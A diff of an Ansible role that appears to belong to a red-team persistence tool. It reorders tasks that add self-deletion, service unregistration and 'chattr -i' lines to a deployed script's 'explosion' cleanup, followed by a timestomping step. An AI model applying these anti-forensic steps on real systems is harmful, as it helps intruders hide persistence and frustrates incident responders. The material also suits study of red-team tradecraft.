@@ -100,22 +100,22 @@
     regexp: '^log_location=.*'
     replace: 'log_location="{{ doubletap_sh_loop_log_path }}" # Set to /dev/null for no output (and comment out line 14)'
 
-- name: Add command to delete the script after execution
-  lineinfile:
-    path: "{{ doubletap_sh_loop_script_path }}"
-    line: "rm -f {{ doubletap_sh_loop_script_path }}"
-    insertafter: "# Cleanup after explosion"
-
 - name: Add script removal from startup task to the script
   lineinfile:
     path: "{{ doubletap_sh_loop_script_path }}"
     line: "update-rc.d -f {{ doubletap_sh_loop_service_name }} remove"
     insertafter: "# Cleanup after explosion"
 
-- name: Remove init.d script after execution (cleanup)
+- name: Add command to delete the script after execution
   lineinfile:
     path: "{{ doubletap_sh_loop_script_path }}"
-    line: "rm -f /etc/init.d/{{ doubletap_sh_loop_service_name }}"
+    line: "rm -f {{ doubletap_sh_loop_script_path }}"
+    insertafter: "# Cleanup after explosion"
+
+- name: Add command to delete the script after execution
+  lineinfile:
+    path: "{{ doubletap_sh_loop_script_path }}"
+    line: "chattr -i {{ doubletap_sh_loop_script_path }}"
     insertafter: "# Cleanup after explosion"
 
 - name: Timestomp the initd file
